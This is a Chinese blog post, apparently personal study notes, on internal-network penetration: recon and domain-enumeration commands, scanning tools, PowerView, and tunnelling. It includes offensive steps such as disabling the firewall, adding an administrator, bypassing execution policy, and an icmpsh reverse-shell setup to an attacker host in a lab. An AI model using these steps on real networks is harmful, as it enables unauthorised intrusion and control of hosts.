@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透笔记">
+<meta property="og:url" content="http://mamor5409.github.io/posts/3a86f9fc/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/sysinfo.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/wmic_product.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/icmp_ping.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/namp_icmp.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/arp-scan.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/namp_arp.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/scanline.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nbtscan.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/msf_netbios.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nmap_netbios.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/msf_portscan_tcp.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/icmpsh_shell.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_nv.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_portscan.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_file.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_talk.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_ubuntu_error.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/ubuntu_nc_tra.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_shell1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_shell2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_shell3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_shell4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/neiwangdaili_shell.jpg">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/nc_shell5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/powercat1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/3a86f9fc/powercat_shell1.png">
+<meta property="article:published_time" content="2021-06-21T07:28:47.000Z">
+<meta property="article:modified_time" content="2021-06-23T09:27:47.047Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/3a86f9fc/sysinfo.png">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/3a86f9fc/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网渗透笔记 | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/3a86f9fc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-21 15:28:47" itemprop="dateCreated datePublished" datetime="2021-06-21T15:28:47+08:00">2021-06-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-23 17:27:47" itemprop="dateModified" datetime="2021-06-23T17:27:47+08:00">2021-06-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h4><p><code>ipconfig /all </code>查询网络配置</p>
+<h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><p><code>net user </code> 查询用户列表</p>
+<p><code>net user XXX /domain</code>   查询指定用户的详细信息</p>
+<p><code>net localgroup administrators</code> 查看当前用户权限</p>
+<p><code>net localgroup administrators 用户名 /add </code> 添加用户到管理组  `</p>
+<p><code>quser</code>  / <code>quser UserName</code>  / <code>qwinsta</code>查看当前在线用户</p>
+<h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><p><code>tasklist /v</code>  查询进程列表</p>
+<p><code>wmic process list brief</code> 查询进程列表</p>
+<h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><p><code>systeminfo</code> </p>
+<p><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code> 获取操作系统和版本信息</p>
+<p><img src="/posts/3a86f9fc/sysinfo.png"></p>
+<p><code>wmic product get name.version</code> 查看本机安装的软件和版本信息</p>
+<p><img src="/posts/3a86f9fc/wmic_product.png"></p>
+<p><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code>  查看本机安装的软件和版本信息</p>
+<p><code>netstat -ano</code> 查看端口列表</p>
+<p><code>systeminfo </code>查询补丁信息</p>
+<p><code>wmic qfe get description,installedOn /format:csv</code> 查看补丁信息</p>
+<p><code>net share</code> 查询本机共享</p>
+<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p><code>netsh advfirewall show allprofiles</code> 查看防火墙状态</p>
+<p><code>netsh firewall show logging</code> 防火墙日志目录</p>
+<p><code>netsh advfirewall set allprofiles state off</code>  关闭防火墙（winServer 2003以后）</p>
+<hr>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><h4 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h4><p><code>ipconfig /all</code>查看信息</p>
+<p><code>net time /domain</code> 判断是否存在  </p>
+<blockquote>
+<p>存在   返回域信息和时间 </p>
+<p>存在但权限不足  发生系统错误 拒绝访问</p>
+<p>不存在 找不到域Workgroup的域控制器</p>
+</blockquote>
+<br>
+
+<h4 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h4><h5 id="基于ICMP"><a href="#基于ICMP" class="headerlink" title="基于ICMP"></a>基于ICMP</h5><ul>
+<li>windows</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,254) do @ping 192.168.56.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">%i in (1,1,254)    遍历主机位从1 ~254的所有IP </span><br><span class="line">-n    ping的次数           </span><br><span class="line">-w    等待每次回复的时长（毫秒）            </span><br><span class="line">192.168.0.%i    遍历IP 自192.168.0.1~192.168.0.254的所有IP           </span><br><span class="line">| bat    管道，将前面的结果通过管道输入给后面的命令  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/3a86f9fc/icmp_ping.png"></p>
+<ul>
+<li>Linux</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>nmap扫描</li>
+</ul>
+<p><code>nmap ‐sP ‐PI 192.168.0.1/24 ‐T4</code></p>
+<p><img src="/posts/3a86f9fc/namp_icmp.png"></p>
+<br>
+
+<h5 id="基于arp"><a href="#基于arp" class="headerlink" title="基于arp"></a>基于arp</h5><ul>
+<li>arp-scan   下载地址: <a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></li>
+</ul>
+<p>用法 <code>arp-scan.exe -t 192.168.56.0/24</code></p>
+<p><img src="/posts/3a86f9fc/arp-scan.png"></p>
+<ul>
+<li>arp</li>
+</ul>
+<p><code>arp -a</code></p>
+<ul>
+<li>nmap扫描</li>
+</ul>
+<p><code>nmap -sn -PR 192.168.0.1/24</code></p>
+<p><img src="/posts/3a86f9fc/namp_arp.png"></p>
+<ul>
+<li>msf扫描</li>
+</ul>
+<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
+<br>
+
+<h5 id="基于udp"><a href="#基于udp" class="headerlink" title="基于udp"></a>基于udp</h5><ul>
+<li>scanline</li>
+</ul>
+<p><code>scanline.exe 192.168.56.101</code></p>
+<p><img src="/posts/3a86f9fc/scanline.png"></p>
+<br>
+
+<h5 id="基于NetBIOS"><a href="#基于NetBIOS" class="headerlink" title="基于NetBIOS"></a>基于NetBIOS</h5><ul>
+<li>nbtscan</li>
+</ul>
+<p><code>nbtscan -r 192.168.0.0/24</code></p>
+<p><img src="/posts/3a86f9fc/nbtscan.png"></p>
+<ul>
+<li>msf扫描</li>
+</ul>
+<p><code>use auxiliary/scanner/netbios/nbname</code><br><img src="/posts/3a86f9fc/msf_netbios.png"></p>
+<ul>
+<li>nmap扫描</li>
+</ul>
+<p><code>nmap -sU --script nbstat.nse -p137 192.168.0.1/24 -T4</code></p>
+<p><img src="/posts/3a86f9fc/nmap_netbios.png"></p>
+<br>
+
+<h4 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h4><h5 id="利用telnet-命令进行扫描"><a href="#利用telnet-命令进行扫描" class="headerlink" title="利用telnet 命令进行扫描"></a>利用telnet 命令进行扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 目标ip地址 端口号</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用msf扫描主机端口"><a href="#利用msf扫描主机端口" class="headerlink" title="利用msf扫描主机端口"></a>利用msf扫描主机端口</h5><p><code>use auxiliary/scanner/portscan/tcp</code></p>
+<p><code>show options </code></p>
+<p><code>set ports 1-1024 </code></p>
+<p><code>set RHOSTS 192.168.1.114</code></p>
+<p><code>set THREADS 10 </code></p>
+<p><code>run</code></p>
+<p><img src="/posts/3a86f9fc/msf_portscan_tcp.png"></p>
+<h4 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h4><p><code>net view /domain</code> 查看域</p>
+<p><code>net view /domain:域名</code> 查看域的电脑</p>
+<p><code>net group /domain</code> 查看域内用户组的列表</p>
+<p><code>net group &quot;domain computers&quot; /domain </code>  查询域成员的列表</p>
+<p><code>net account /domain</code></p>
+<h4 id="查找域内用户和管理员"><a href="#查找域内用户和管理员" class="headerlink" title="查找域内用户和管理员"></a>查找域内用户和管理员</h4><p><code>net user /domain</code></p>
+<h4 id="内网定位管理员工具"><a href="#内网定位管理员工具" class="headerlink" title="内网定位管理员工具"></a>内网定位管理员工具</h4><p>参考 <a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/32859.html">https://www.secpulse.com/archives/32859.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p>
+<ul>
+<li><p>Empire  user_hunter模块</p>
+</li>
+<li><p>psloggedon.exe</p>
+</li>
+</ul>
+<p><code>PsLoggedon.exe</code></p>
+<ul>
+<li>PVEFindADUser.exe</li>
+</ul>
+<p><code>PVEFindADUser.exe --current</code> 枚举出域用户以及登陆过特定系统的用户(需要管理员权限)</p>
+<ul>
+<li>Netsess.exe </li>
+</ul>
+<p>查询所有域控制器，获取所有的活跃域 </p>
+<p>下载地址:<a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
+<p>用法 <code>Netsess.exe -h</code></p>
+<br>
+
+<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>版本</p>
+<blockquote>
+<p>2.0     win2008,win7</p>
+<p>3.0    win2018,win8</p>
+<p>4.0    win2012R2,win8.1</p>
+<p>5.0    win2016,win10</p>
+</blockquote>
+<p>存在4中权限</p>
+<blockquote>
+<p>Restricted     不允许执行任何脚本</p>
+<p>Allsigned        只允许执行经过证书验证的脚本</p>
+<p>Unrestricted    允许执行任何脚本</p>
+<p>RemoteSigned    本地脚本不限制，对外部脚本需要经过证书验证</p>
+</blockquote>
+<p><code>Get-ExecutionPolicy</code>     查看PS权限</p>
+<p><code>Set-ExecutionPolicy +权限</code></p>
+<p>一般会用cmd 命令行  使用<code>-exec bypass</code>进行powershell绕过</p>
+<h5 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h5><p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
+<p><code>Import-Module</code>为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1</p>
+<p>格式：</p>
+<p><code>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot;</code></p>
+<p>powershell.exe -exec bypass -Command “&amp; {Import-Module C:\PowerView.ps1; Get-NetUser}”</p>
+<p>PowerView命令参数</p>
+<blockquote>
+<p>Get-NetDomain: 获取当前用户所在域的名称<br>Get-NetUser: 获取所有用户的详细信息<br>Get-NetDomainController: 获取所有域控制器的信息<br>Get-NetComputer: 获取域内所有机器的详细信息<br>Get-NetOU: 获取域中的OU信息<br>Get-NetGroup: 获取所有域内组和组成员信息<br>Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息<br>Get-NetShare: 获取当前域内所有网络共享信息<br>Get-NetSession: 获取指定服务器的会话<br>Get-NetRDPSession: 获取指定服务器的远程连接<br>Get-NetProcess: 获取远程主机的进程<br>Get-UserEvent: 获取指定用户的日志<br>Get-ADObiect: 获取活动目录的对象<br>Get-NetGPO: 获取域内所有的组策略对象<br>Get-DomainPolicy: 获取域默认策略或域控制器策略<br>Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限<br>Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户<br>Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</p>
+</blockquote>
+<br>
+
+<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHound需要使用neo4j数据库，配备java环境</p>
+<p>下载地址 <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
+<blockquote>
+<p>URL：neo4j://localhost:7687<br>用户名(默认)：neo4j<br>密码(默认)：neo4j</p>
+</blockquote>
+<p>使用【待补充 】·</p>
+<hr>
+<h3 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h3><p>隧道: 绕过防火墙屏蔽的一种方式</p>
+<br>
+
+<p>网络层隧道：</p>
+<ul>
+<li>IPv6</li>
+<li>ICMP</li>
+</ul>
+<p>传输层</p>
+<ul>
+<li>TCP</li>
+<li>UDP</li>
+</ul>
+<p>应用层</p>
+<ul>
+<li>SSH</li>
+<li>HTTP</li>
+<li>DNS</li>
+</ul>
+<br>
+
+<h4 id="内网连通性判断"><a href="#内网连通性判断" class="headerlink" title="内网连通性判断"></a>内网连通性判断</h4><ul>
+<li><p>ICMP协议</p>
+<p>  ping ip</p>
+</li>
+<li><p>TCP协议</p>
+<p>  nc  -zc ip port</p>
+</li>
+<li><p>HTTP协议</p>
+<p>  curl ip:port</p>
+</li>
+<li><p>DNS协议</p>
+<p>  nslookup  <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> </p>
+<p>  dig @8.8.8.8 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+</li>
+</ul>
+<br>
+
+<br>
+
+<h4 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h4><ul>
+<li>Ipv6隧道</li>
+<li>ICMP隧道</li>
+</ul>
+<br>
+
+<h5 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h5><p>ICMP隧道工具：icmpsh，Pingtunnel</p>
+<p>icmpsh (仅适用于windows，执行icmpsh.exe不需要管理员权限)</p>
+<p>Pingtunnel</p>
+<br>
+
+<h5 id="icmpsh反弹shell"><a href="#icmpsh反弹shell" class="headerlink" title="icmpsh反弹shell"></a>icmpsh反弹shell</h5><p>参考:<a target="_blank" rel="noopener" href="https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ">https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ</a></p>
+<p>安装 <code>git clone https://github.com/inquisb/icmpsh.git</code></p>
+<p>安装依赖库<code>sudo  pip2 install impacket</code></p>
+<blockquote>
+<p>环境</p>
+<p>kali 192.168.0.128<br>win7 192.168.0.129</p>
+</blockquote>
+<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> 关闭本地系统的icmp应答，恢复改为0即可</p>
+<p>将 icmpsh.exe传到win7中，这里开启个http服务去下载<code>python3 -m http.server 9999</code></p>
+<p>win7访问192.168.0.128:9999 去下载 icmpsh.exe</p>
+<p>icmpsh.exe参数</p>
+<blockquote>
+<p>-t host         :指定攻击者IP<br>-r              :用于测试连接<br>-d milliseconds :设置请求之间的延迟(毫秒)<br>-o milliseconds :设置响应超时时间(毫秒),超时一次则计数器+1<br>-b num          :设置多少次退出<br>-s bytes        :最大数据缓冲区大小(字节)</p>
+</blockquote>
+<p>kali:<code>sudo python2 icmpsh_m.py  192.168.0.128[kali] 192.168.0.129[win7]</code></p>
+<p>win7 <code>icmpsh.exe -t 192.168.0.128</code></p>
+<p>成功反弹shell</p>
+<p><img src="/posts/3a86f9fc/icmpsh_shell.png"></p>
+<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0</code>恢复原设置</p>
+<br>
+
+<h5 id="PingTunnel使用"><a href="#PingTunnel使用" class="headerlink" title="PingTunnel使用"></a>PingTunnel使用</h5><p>【待补充】</p>
+<hr>
+<h4 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h4><h5 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h5><p>【待补充】</p>
+<h5 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h5><p>下载地址（解压密码为nc）:</p>
+<p><a target="_blank" rel="noopener" href="https://joncraton.org/files/nc111nt.zip">https://joncraton.org/files/nc111nt.zip</a></p>
+<p><a target="_blank" rel="noopener" href="https://joncraton.org/files/nc111nt_safe.zip">https://joncraton.org/files/nc111nt_safe.zip</a></p>
+<br>
+
+<h6 id="获取banner信息"><a href="#获取banner信息" class="headerlink" title="获取banner信息"></a>获取banner信息</h6><p><code>nc -nv 192.168.0.130 22</code></p>
+<p><img src="/posts/3a86f9fc/nc_nv.png"></p>
+<h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6><p><code>nc -zv 192.168.56.101 1080</code></p>
+<p><img src="/posts/3a86f9fc/nc_portscan.png">              </p>
+<h6 id="远程连接主机"><a href="#远程连接主机" class="headerlink" title="远程连接主机"></a>远程连接主机</h6><p><code>nc -nvv 192.168.0.129 80</code>                                                     </p>
+<h6 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h6><p><code>nc -lp 9999</code> 监听本地9999端口，访问该端口是会输出信息</p>
+<h6 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h6><p>Ubuntu: <code>nc -lp 6666 &gt; test.txt</code> 开启监听</p>
+<p>kali：<code>echo &#39;test&#39; &gt; test.txt</code></p>
+<p><code>nc -vn 192.168.0.130 6666 &lt; test.txt -q 1</code></p>
+<p><img src="/posts/3a86f9fc/nc_file.png"></p>
+<h6 id="简易聊天"><a href="#简易聊天" class="headerlink" title="简易聊天"></a>简易聊天</h6><p>Ubuntu: <code>nc -l -p 8888</code></p>
+<p>kali：<code>nc -vn 192.168.0.130 8888</code></p>
+<p><img src="/posts/3a86f9fc/nc_talk.png"></p>
+<h5 id="nc获取shell"><a href="#nc获取shell" class="headerlink" title="nc获取shell"></a>nc获取shell</h5><p>参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91dd4ab317c7">https://www.jianshu.com/p/91dd4ab317c7</a></p>
+<br>
+
+<blockquote>
+<p>正向shell   目标机进行监听<br>反向shell   攻击机进行监听</p>
+</blockquote>
